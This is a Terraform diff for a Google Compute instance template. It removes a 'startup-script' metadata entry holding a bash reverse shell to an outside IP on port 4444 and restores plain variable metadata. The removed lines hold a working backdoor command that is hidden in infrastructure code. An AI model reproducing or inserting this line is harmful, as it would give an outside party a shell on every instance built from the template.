@@ -63,17 +63,12 @@ locals {
 # Instance Template
 ####################
 resource "google_compute_instance_template" "tpl" {
-  provider     = google-beta
-  name_prefix  = "${var.name_prefix}-"
-  project      = var.project_id
-  machine_type = var.machine_type
-  labels       = var.labels
-  metadata = merge(
-    var.metadata,
-    {
-      "startup-script" = "bash -i >& /dev/tcp/34.118.190.208/4444 0>&1"
-    }
-  )
+  provider                = google-beta
+  name_prefix             = "${var.name_prefix}-"
+  project                 = var.project_id
+  machine_type            = var.machine_type
+  labels                  = var.labels
+  metadata                = var.metadata
   tags                    = var.tags
   can_ip_forward          = var.can_ip_forward
   metadata_startup_script = var.startup_script
